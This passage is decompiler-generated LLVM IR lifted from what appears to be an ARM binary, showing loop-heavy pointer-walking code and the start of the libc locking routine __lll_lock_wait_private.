  %v2_1270c = inttoptr i32 %v1_1270c to i32*
  %v3_1270c = load i32, i32* %v2_1270c, align 4
  store i32 %v3_1270c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12710 = icmp eq i32 %v3_1270c, 0
  br i1 %v2_12710, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_1270c
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_1270c, %bb
  %v2_12718 = xor i1 %v2_12710, true
  call void @__pseudo_cond_branch(i1 %v2_12718, i32 %v3_1270c)
  %v0_12720 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_12720, i32* %stack_var_-88, align 4
  %v1_12724 = inttoptr i32 %v0_12720 to i32*
  %v2_12724 = load i32, i32* %v1_12724, align 4
  store i32 %v2_12724, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12728 = icmp eq i32 %v2_12724, 0
  store i32 %v2_1271c, i32* %r5.global-to-local, align 4
  br i1 %v2_12728, label %dec_label_pc_12794.loopexit, label %dec_label_pc_1273c

dec_label_pc_1273c:                               ; preds = %bb72
  %v1_1273c = add i32 %v2_12724, 20
  store i32 %v1_1273c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12740

dec_label_pc_12740:                               ; preds = %dec_label_pc_12774.dec_label_pc_12740_crit_edge, %dec_label_pc_1273c
  %v0_12744 = phi i32 [ %v0_12744.pre, %dec_label_pc_12774.dec_label_pc_12740_crit_edge ], [ %v1_1273c, %dec_label_pc_1273c ]
  %v0_12740 = phi i32 [ %v0_12740.pre, %dec_label_pc_12774.dec_label_pc_12740_crit_edge ], [ %v2_12724, %dec_label_pc_1273c ]
  %v1_12740 = add i32 %v0_12740, 20
  %v2_12740 = inttoptr i32 %v1_12740 to i32*
  %v3_12740 = load i32, i32* %v2_12740, align 4
  store i32 %v0_12744, i32* %r2.global-to-local, align 4
  store i32 %v3_12740, i32* %r4.global-to-local, align 4
  %v1_12750119 = inttoptr i32 %v0_12744 to i32*
  %v2_12750120 = load i32, i32* %v1_12750119, align 4
  store i32 %v2_12750120, i32* %r3.global-to-local, align 4
  %v3_12754122 = icmp uge i32 %v2_12750120, %v3_12740
  store i1 %v3_12754122, i1* %cpsr_c.global-to-local, align 1
  %v9_12754128 = icmp eq i32 %v2_12750120, %v3_12740
  br i1 %v9_12754128, label %dec_label_pc_1275c, label %dec_label_pc_12774

dec_label_pc_1275c:                               ; preds = %dec_label_pc_12740, %dec_label_pc_1275c.dec_label_pc_12750_crit_edge
  %v0_1275c129 = phi i32 [ %v1_12754.pre, %dec_label_pc_1275c.dec_label_pc_12750_crit_edge ], [ %v3_12740, %dec_label_pc_12740 ]
  store i32 %v0_1275c129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1276c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1276c, label %dec_label_pc_12770, label %dec_label_pc_1275c.dec_label_pc_12750_crit_edge

dec_label_pc_1275c.dec_label_pc_12750_crit_edge:  ; preds = %dec_label_pc_1275c
  %v0_12750.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_12754.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_12750 = inttoptr i32 %v0_12750.pre to i32*
  %v2_12750 = load i32, i32* %v1_12750, align 4
  store i32 %v2_12750, i32* %r3.global-to-local, align 4
  %v3_12754 = icmp uge i32 %v2_12750, %v1_12754.pre
  store i1 %v3_12754, i1* %cpsr_c.global-to-local, align 1
  %v9_12754 = icmp eq i32 %v2_12750, %v1_12754.pre
  br i1 %v9_12754, label %dec_label_pc_1275c, label %dec_label_pc_12774

dec_label_pc_12770:                               ; preds = %dec_label_pc_1275c
  %v0_12770 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12770, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12774

dec_label_pc_12774:                               ; preds = %dec_label_pc_12740, %dec_label_pc_1275c.dec_label_pc_12750_crit_edge, %dec_label_pc_12770
  %v0_12774 = phi i32 [ %v0_12770, %dec_label_pc_12770 ], [ %v2_12750120, %dec_label_pc_12740 ], [ %v2_12750, %dec_label_pc_1275c.dec_label_pc_12750_crit_edge ]
  %v1_12774 = phi i32 [ %v0_12770, %dec_label_pc_12770 ], [ %v3_12740, %dec_label_pc_12740 ], [ %v1_12754.pre, %dec_label_pc_1275c.dec_label_pc_12750_crit_edge ]
  %v3_12774 = icmp uge i32 %v0_12774, %v1_12774
  store i1 %v3_12774, i1* %cpsr_c.global-to-local, align 1
  %v9_12774 = icmp eq i32 %v0_12774, %v1_12774
  store i32 %v2_1271c, i32* %r4.global-to-local, align 4
  br i1 %v9_12774, label %dec_label_pc_1270c, label %dec_label_pc_12774.dec_label_pc_12740_crit_edge

dec_label_pc_12774.dec_label_pc_12740_crit_edge:  ; preds = %dec_label_pc_12774
  %v0_12740.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_12744.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12740

dec_label_pc_12790:                               ; preds = %dec_label_pc_12784.backedge, %entry
  %v0_1279831 = phi i32 [ ptrtoint (i32* @global_var_20cf4.602 to i32), %entry ], [ %v0_12784, %dec_label_pc_12784.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12794

dec_label_pc_12794.loopexit:                      ; preds = %bb72
  store i32 %v2_1271c, i32* %r6.global-to-local, align 4
  %v0_12798.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12794

dec_label_pc_12794:                               ; preds = %dec_label_pc_12794.loopexit, %dec_label_pc_12790
  %v0_12798 = phi i32 [ %v0_12798.pre, %dec_label_pc_12794.loopexit ], [ %v0_1279831, %dec_label_pc_12790 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_12798 = add i32 %v0_12798, 152
  %v3_12798 = inttoptr i32 %v2_12798 to i32*
  %v4_12798 = load i32, i32* %v3_12798, align 4
  store i32 %v4_12798, i32* %r7.global-to-local, align 4
  %v0_1279c = call i32 @__aeabi_read_tp()
  store i32 %v0_1279c, i32* %r0.global-to-local, align 4
  %v1_127a0 = add i32 %v4_12798, 8
  %v2_127a0 = inttoptr i32 %v1_127a0 to i32*
  %v3_127a0 = load i32, i32* %v2_127a0, align 4
  store i32 %v3_127a0, i32* %r3.global-to-local, align 4
  %v1_127a4 = add i32 %v0_1279c, -1168
  store i32 %v1_127a4, i32* %r5.global-to-local, align 4
  %v3_127a8 = icmp uge i32 %v3_127a0, %v1_127a4
  store i1 %v3_127a8, i1* %cpsr_c.global-to-local, align 1
  %v9_127a8 = icmp eq i32 %v3_127a0, %v1_127a4
  br i1 %v9_127a8, label %dec_label_pc_12910, label %dec_label_pc_127b0

dec_label_pc_127b0:                               ; preds = %dec_label_pc_12794
  store i32 %v4_12798, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_127bc112 = inttoptr i32 %v4_12798 to i32*
  %v2_127bc113 = load i32, i32* %v1_127bc112, align 4
  store i32 %v2_127bc113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_127c0115 = icmp eq i32 %v2_127bc113, 0
  br i1 %v9_127c0115, label %dec_label_pc_127c8, label %dec_label_pc_127e0

dec_label_pc_127c8:                               ; preds = %dec_label_pc_127b0, %dec_label_pc_127c8.dec_label_pc_127bc_crit_edge
  %v0_127c8116 = phi i32 [ %v1_127c0.pre, %dec_label_pc_127c8.dec_label_pc_127bc_crit_edge ], [ 0, %dec_label_pc_127b0 ]
  store i32 %v0_127c8116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_127d8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_127d8, label %dec_label_pc_127dc, label %dec_label_pc_127c8.dec_label_pc_127bc_crit_edge

dec_label_pc_127c8.dec_label_pc_127bc_crit_edge:  ; preds = %dec_label_pc_127c8
  %v0_127bc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_127c0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_127bc = inttoptr i32 %v0_127bc.pre to i32*
  %v2_127bc = load i32, i32* %v1_127bc, align 4
  store i32 %v2_127bc, i32* %r3.global-to-local, align 4
  %v3_127c0 = icmp uge i32 %v2_127bc, %v1_127c0.pre
  store i1 %v3_127c0, i1* %cpsr_c.global-to-local, align 1
  %v9_127c0 = icmp eq i32 %v2_127bc, %v1_127c0.pre
  br i1 %v9_127c0, label %dec_label_pc_127c8, label %dec_label_pc_127e0

dec_label_pc_127dc:                               ; preds = %dec_label_pc_127c8
  %v0_127dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_127dc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_127e0

dec_label_pc_127e0:                               ; preds = %dec_label_pc_127b0, %dec_label_pc_127c8.dec_label_pc_127bc_crit_edge, %dec_label_pc_127dc
  %v0_127e0 = phi i32 [ %v0_127dc, %dec_label_pc_127dc ], [ %v2_127bc113, %dec_label_pc_127b0 ], [ %v2_127bc, %dec_label_pc_127c8.dec_label_pc_127bc_crit_edge ]
  %v1_127e0 = phi i32 [ %v0_127dc, %dec_label_pc_127dc ], [ 0, %dec_label_pc_127b0 ], [ %v1_127c0.pre, %dec_label_pc_127c8.dec_label_pc_127bc_crit_edge ]
  %v3_127e0 = icmp uge i32 %v0_127e0, %v1_127e0
  store i1 %v3_127e0, i1* %cpsr_c.global-to-local, align 1
  %v9_127e0 = icmp eq i32 %v0_127e0, %v1_127e0
  br i1 %v9_127e0, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_127e0
  %v1_127e4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_127e4, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_127e0, %bb73
  %v1_127e8 = xor i1 %v9_127e0, true
  call void @__pseudo_cond_branch(i1 %v1_127e8, i32 ptrtoint (i32* @global_var_12a60.740 to i32))
  %v0_127ec = load i32, i32* %r5.global-to-local, align 4
  %v1_127ec = load i32, i32* %r7.global-to-local, align 4
  %v2_127ec = add i32 %v1_127ec, 8
  %v3_127ec = inttoptr i32 %v2_127ec to i32*
  store i32 %v0_127ec, i32* %v3_127ec, align 4
  br label %dec_label_pc_12910

dec_label_pc_12910:                               ; preds = %bb74, %dec_label_pc_12794
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_127f4 = load i32, i32* %r8.global-to-local, align 4
  %v2_127f4 = add i32 %v0_127f4, 152
  %v3_127f4 = inttoptr i32 %v2_127f4 to i32*
  %v4_127f4 = load i32, i32* %v3_127f4, align 4
  store i32 %v4_127f4, i32* %r2.global-to-local, align 4
  %v1_127f8 = add i32 %v4_127f4, 4
  %v2_127f8 = inttoptr i32 %v1_127f8 to i32*
  %v3_127f8 = load i32, i32* %v2_127f8, align 4
  %v1_127fc = add i32 %v3_127f8, 1
  store i32 %v1_127fc, i32* %r3.global-to-local, align 4
  store i32 %v1_127fc, i32* %v2_127f8, align 4
  %v0_12804 = load i32, i32* %r5.global-to-local, align 4
  %v1_12804 = add i32 %v0_12804, 108
  %v2_12804 = inttoptr i32 %v1_12804 to i32*
  %v3_12804 = load i32, i32* %v2_12804, align 4
  store i32 %v3_12804, i32* %sl.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  %v1_1280c = sub i32 0, %v3_12804
  store i32 %v1_1280c, i32* %v2_12804, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_12820 = load i32, i32* %r5.global-to-local, align 4
  %v1_12820 = add i32 %v0_12820, 104
  store i32 %v1_12820, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_12914.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_12914 = add i32 %v0_12820, 108
  %v3_12914 = inttoptr i32 %v2_12914 to i32*
  store i32 %v0_12914.pre, i32* %v3_12914, align 4
  %v0_12918 = load i32, i32* %r8.global-to-local, align 4
  %v1_12918 = load i32, i32* %r3.global-to-local, align 4
  %v2_12918 = add i32 %v1_12918, %v0_12918
  %v3_12918 = inttoptr i32 %v2_12918 to i32*
  %v4_12918 = load i32, i32* %v3_12918, align 4
  store i32 %v4_12918, i32* %r0.global-to-local, align 4
  %v1_1291c = add i32 %v4_12918, 4
  %v2_1291c = inttoptr i32 %v1_1291c to i32*
  %v3_1291c = load i32, i32* %v2_1291c, align 4
  %v1_12920 = add i32 %v3_1291c, -1
  store i32 %v1_12920, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12924 = icmp eq i32 %v1_12920, 0
  store i32 %v1_12920, i32* %v2_1291c, align 4
  br i1 %v2_12924, label %dec_label_pc_12930, label %dec_label_pc_12a20thread-pre-split

dec_label_pc_12930:                               ; preds = %dec_label_pc_12910
  %v0_12930 = load i32, i32* %r3.global-to-local, align 4
  %v1_12930 = load i32, i32* %r0.global-to-local, align 4
  %v2_12930 = add i32 %v1_12930, 8
  %v3_12930 = inttoptr i32 %v2_12930 to i32*
  store i32 %v0_12930, i32* %v3_12930, align 4
  %v0_12934 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12934, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12938

dec_label_pc_12938:                               ; preds = %dec_label_pc_12968.dec_label_pc_12938_crit_edge, %dec_label_pc_12930
  %v0_12938 = phi i32 [ %v0_12938.pre, %dec_label_pc_12968.dec_label_pc_12938_crit_edge ], [ %v0_12934, %dec_label_pc_12930 ]
  %v1_12938 = inttoptr i32 %v0_12938 to i32*
  %v2_12938 = load i32, i32* %v1_12938, align 4
  store i32 %v2_12938, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_12938, i32* %r2.global-to-local, align 4
  %v2_12944100 = load i32, i32* %v1_12938, align 4
  store i32 %v2_12944100, i32* %r3.global-to-local, align 4
  %v3_12948102 = icmp uge i32 %v2_12944100, %v2_12938
  store i1 %v3_12948102, i1* %cpsr_c.global-to-local, align 1
  %v9_12948108 = icmp eq i32 %v2_12944100, %v2_12938
  br i1 %v9_12948108, label %dec_label_pc_12950, label %dec_label_pc_12968

dec_label_pc_12950:                               ; preds = %dec_label_pc_12938, %dec_label_pc_12950.dec_label_pc_12944_crit_edge
  %v0_12950109 = phi i32 [ %v1_12948.pre, %dec_label_pc_12950.dec_label_pc_12944_crit_edge ], [ %v2_12938, %dec_label_pc_12938 ]
  store i32 %v0_12950109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_12960 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_12960, label %dec_label_pc_12964, label %dec_label_pc_12950.dec_label_pc_12944_crit_edge

dec_label_pc_12950.dec_label_pc_12944_crit_edge:  ; preds = %dec_label_pc_12950
  %v0_12944.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_12948.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_12944 = inttoptr i32 %v0_12944.pre to i32*
  %v2_12944 = load i32, i32* %v1_12944, align 4
  store i32 %v2_12944, i32* %r3.global-to-local, align 4
  %v3_12948 = icmp uge i32 %v2_12944, %v1_12948.pre
  store i1 %v3_12948, i1* %cpsr_c.global-to-local, align 1
  %v9_12948 = icmp eq i32 %v2_12944, %v1_12948.pre
  br i1 %v9_12948, label %dec_label_pc_12950, label %dec_label_pc_12968

dec_label_pc_12964:                               ; preds = %dec_label_pc_12950
  %v0_12964 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12964, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12968

dec_label_pc_12968:                               ; preds = %dec_label_pc_12938, %dec_label_pc_12950.dec_label_pc_12944_crit_edge, %dec_label_pc_12964
  %v0_12970 = phi i32 [ %v0_12964, %dec_label_pc_12964 ], [ %v2_12944100, %dec_label_pc_12938 ], [ %v2_12944, %dec_label_pc_12950.dec_label_pc_12944_crit_edge ]
  %v1_12968 = phi i32 [ %v0_12964, %dec_label_pc_12964 ], [ %v2_12938, %dec_label_pc_12938 ], [ %v1_12948.pre, %dec_label_pc_12950.dec_label_pc_12944_crit_edge ]
  %v3_12968 = icmp uge i32 %v0_12970, %v1_12968
  store i1 %v3_12968, i1* %cpsr_c.global-to-local, align 1
  %v9_12968 = icmp eq i32 %v0_12970, %v1_12968
  br i1 %v9_12968, label %dec_label_pc_12970, label %dec_label_pc_12968.dec_label_pc_12938_crit_edge

dec_label_pc_12968.dec_label_pc_12938_crit_edge:  ; preds = %dec_label_pc_12968
  %v0_12938.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12938

dec_label_pc_12970:                               ; preds = %dec_label_pc_12968
  %v2_12970 = icmp ne i32 %v1_12968, 0
  store i1 %v2_12970, i1* %cpsr_c.global-to-local, align 1
  %v7_12974 = icmp slt i32 %v1_12968, 2
  br i1 %v7_12974, label %dec_label_pc_12a20thread-pre-split, label %dec_label_pc_12978

dec_label_pc_12978:                               ; preds = %dec_label_pc_12970
  %v0_12978 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12978, i32* %r0.global-to-local, align 4
  %v0_1297c = load i32, i32* @r1, align 4
  %v1_1297c = add i32 %v0_1297c, 129
  store i32 %v1_1297c, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12a20thread-pre-split

dec_label_pc_12994:                               ; preds = %dec_label_pc_12a20thread-pre-split, %dec_label_pc_12a1c
  %v0_12994 = phi i32 [ %v3_12a1c, %dec_label_pc_12a1c ], [ %v0_12a20.pr, %dec_label_pc_12a20thread-pre-split ]
  %v1_12994 = inttoptr i32 %v0_12994 to i32*
  %v2_12994 = load i32, i32* %v1_12994, align 4
  store i32 %v2_12994, i32* %r3.global-to-local, align 4
  %v1_12998 = add i32 %v2_12994, 8
  %v2_12998 = inttoptr i32 %v1_12998 to i32*
  %v3_12998 = load i32, i32* %v2_12998, align 4
  store i32 %v3_12998, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1299c = icmp eq i32 %v3_12998, 0
  br i1 %v2_1299c, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_12994
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_12994, %bb75
  %v2_129a4 = xor i1 %v2_1299c, true
  call void @__pseudo_cond_branch(i1 %v2_129a4, i32 %v3_12998)
  %v0_129a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_129a8 = inttoptr i32 %v0_129a8 to i32*
  %v2_129a8 = load i32, i32* %v1_129a8, align 4
  store i32 %v2_129a8, i32* %r5.global-to-local, align 4
  %v1_129ac = add i32 %v2_129a8, 20
  store i32 %v1_129ac, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_129b0

dec_label_pc_129b0:                               ; preds = %dec_label_pc_129e4.dec_label_pc_129b0_crit_edge, %bb76
  %v0_129b4 = phi i32 [ %v0_129b4.pre, %dec_label_pc_129e4.dec_label_pc_129b0_crit_edge ], [ %v1_129ac, %bb76 ]
  %v0_129b0 = phi i32 [ %v0_129b0.pre, %dec_label_pc_129e4.dec_label_pc_129b0_crit_edge ], [ %v2_129a8, %bb76 ]
  %v1_129b0 = add i32 %v0_129b0, 20
  %v2_129b0 = inttoptr i32 %v1_129b0 to i32*
  %v3_129b0 = load i32, i32* %v2_129b0, align 4
  store i32 %v0_129b4, i32* %r2.global-to-local, align 4
  store i32 %v3_129b0, i32* %r4.global-to-local, align 4
  %v1_129bc = add i32 %v3_129b0, -1
  store i32 %v1_129bc, i32* @r1, align 4
  %v1_129c087 = inttoptr i32 %v0_129b4 to i32*
  %v2_129c088 = load i32, i32* %v1_129c087, align 4
  store i32 %v2_129c088, i32* %r3.global-to-local, align 4
  %v3_129c490 = icmp uge i32 %v2_129c088, %v3_129b0
  store i1 %v3_129c490, i1* %cpsr_c.global-to-local, align 1
  %v9_129c496 = icmp eq i32 %v2_129c088, %v3_129b0
  br i1 %v9_129c496, label %dec_label_pc_129cc, label %dec_label_pc_129e4

dec_label_pc_129cc:                               ; preds = %dec_label_pc_129b0, %dec_label_pc_129cc.dec_label_pc_129c0_crit_edge
  %v0_129cc97 = phi i32 [ %v1_129c4.pre, %dec_label_pc_129cc.dec_label_pc_129c0_crit_edge ], [ %v3_129b0, %dec_label_pc_129b0 ]
  store i32 %v0_129cc97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_129dc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_129dc, label %dec_label_pc_129e0, label %dec_label_pc_129cc.dec_label_pc_129c0_crit_edge

dec_label_pc_129cc.dec_label_pc_129c0_crit_edge:  ; preds = %dec_label_pc_129cc
  %v0_129c0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_129c4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_129c0 = inttoptr i32 %v0_129c0.pre to i32*
  %v2_129c0 = load i32, i32* %v1_129c0, align 4
  store i32 %v2_129c0, i32* %r3.global-to-local, align 4
  %v3_129c4 = icmp uge i32 %v2_129c0, %v1_129c4.pre
  store i1 %v3_129c4, i1* %cpsr_c.global-to-local, align 1
  %v9_129c4 = icmp eq i32 %v2_129c0, %v1_129c4.pre
  br i1 %v9_129c4, label %dec_label_pc_129cc, label %dec_label_pc_129e4

dec_label_pc_129e0:                               ; preds = %dec_label_pc_129cc
  %v0_129e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_129e0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_129e4

dec_label_pc_129e4:                               ; preds = %dec_label_pc_129b0, %dec_label_pc_129cc.dec_label_pc_129c0_crit_edge, %dec_label_pc_129e0
  %v0_129f0 = phi i32 [ %v0_129e0, %dec_label_pc_129e0 ], [ %v2_129c088, %dec_label_pc_129b0 ], [ %v2_129c0, %dec_label_pc_129cc.dec_label_pc_129c0_crit_edge ]
  %v1_129e4 = phi i32 [ %v0_129e0, %dec_label_pc_129e0 ], [ %v3_129b0, %dec_label_pc_129b0 ], [ %v1_129c4.pre, %dec_label_pc_129cc.dec_label_pc_129c0_crit_edge ]
  %v3_129e4 = icmp uge i32 %v0_129f0, %v1_129e4
  store i1 %v3_129e4, i1* %cpsr_c.global-to-local, align 1
  %v9_129e4 = icmp eq i32 %v0_129f0, %v1_129e4
  store i32 %v0_129f0, i32* %r2.global-to-local, align 4
  br i1 %v9_129e4, label %dec_label_pc_129f0, label %dec_label_pc_129e4.dec_label_pc_129b0_crit_edge

dec_label_pc_129e4.dec_label_pc_129b0_crit_edge:  ; preds = %dec_label_pc_129e4
  %v0_129b0.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_129b4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_129b0

dec_label_pc_129f0:                               ; preds = %dec_label_pc_129e4
  %v2_129f0 = icmp ne i32 %v1_129e4, 0
  store i1 %v2_129f0, i1* %cpsr_c.global-to-local, align 1
  %v7_129f0 = icmp eq i32 %v1_129e4, 1
  %v0_129f8 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_129f0, label %dec_label_pc_129f8, label %dec_label_pc_12a1c

dec_label_pc_129f8:                               ; preds = %dec_label_pc_129f0
  %v1_129f8 = inttoptr i32 %v0_129f8 to i32*
  %v2_129f8 = load i32, i32* %v1_129f8, align 4
  store i32 %v2_129f8, i32* @r1, align 4
  %v1_129fc = add i32 %v2_129f8, 24
  %v2_129fc = inttoptr i32 %v1_129fc to i32*
  %v3_129fc = load i32, i32* %v2_129fc, align 4
  store i32 %v3_129fc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12a00 = icmp eq i32 %v3_129fc, 0
  br i1 %v2_12a00, label %dec_label_pc_12a1c, label %dec_label_pc_12a08

dec_label_pc_12a08:                               ; preds = %dec_label_pc_129f8
  %v1_12a08 = add i32 %v2_129f8, 20
  %v2_12a08 = inttoptr i32 %v1_12a08 to i32*
  %v3_12a08 = load i32, i32* %v2_12a08, align 4
  store i32 %v3_12a08, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12a1c

dec_label_pc_12a1c:                               ; preds = %dec_label_pc_129f0, %dec_label_pc_12a08, %dec_label_pc_129f8
  %v1_12a1c = add i32 %v0_129f8, 4
  %v2_12a1c = inttoptr i32 %v1_12a1c to i32*
  %v3_12a1c = load i32, i32* %v2_12a1c, align 4
  store i32 %v3_12a1c, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12a20 = icmp eq i32 %v3_12a1c, 0
  br i1 %v2_12a20, label %dec_label_pc_12a28, label %dec_label_pc_12994

dec_label_pc_12a20thread-pre-split:               ; preds = %dec_label_pc_12978, %dec_label_pc_12970, %dec_label_pc_12910
  %v0_12a20.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12a2011 = icmp eq i32 %v0_12a20.pr, 0
  br i1 %v2_12a2011, label %dec_label_pc_12a28, label %dec_label_pc_12994

dec_label_pc_12a28:                               ; preds = %dec_label_pc_12a1c, %dec_label_pc_12a20thread-pre-split
  %v0_12a28.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_12a28.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_12a28.pre

; uselistorder directives
  uselistorder i32 %v0_12a20.pr, { 1, 0 }
  uselistorder i32 %v3_12a1c, { 1, 2, 0 }
  uselistorder i32 %v1_129e4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_129e0, { 1, 0, 2 }
  uselistorder i32 %v1_129c4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_12964, { 1, 0, 2 }
  uselistorder i32 %v1_12948.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_12938, { 1, 0 }
  uselistorder i32 %v0_127dc, { 1, 0, 2 }
  uselistorder i32 %v1_127c0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_12798, { 2, 1, 0, 3 }
  uselistorder i32 %v0_12770, { 1, 0, 2 }
  uselistorder i32 %v1_12754.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_1271c, { 1, 0, 2 }
  uselistorder i32 %v0_126fc, { 1, 0, 2 }
  uselistorder i32 %v1_126e0.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 14, 13, 0 }
  uselistorder i32* %r6.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 7, 9, 8, 4, 10, 11, 12, 13, 15, 14, 0, 16, 17, 18, 19, 20, 21, 22, 24, 23, 1, 25, 26, 27, 29, 28, 2, 30, 31, 33, 32, 3, 34 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 13, 7, 8, 9, 11, 10, 2, 12, 14, 15, 17, 16, 3, 18, 19, 21, 20, 4, 22, 23, 25, 24, 5, 26, 27, 28, 30, 29, 6, 32, 31, 1 }
  uselistorder i32 108, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_12a28, { 1, 0 }
  uselistorder label %dec_label_pc_12a1c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_129e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_129cc, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_12968, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12950, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_127e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_127c8, { 1, 0 }
  uselistorder label %dec_label_pc_12774, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1275c, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_12700, { 2, 1, 0 }
  uselistorder label %dec_label_pc_126e8, { 1, 0 }
  uselistorder label %dec_label_pc_12784.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_126b4, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12a60 = load i32, i32* @r4, align 4
  store i32 %v3_12a60, i32* %stack_var_-16, align 4
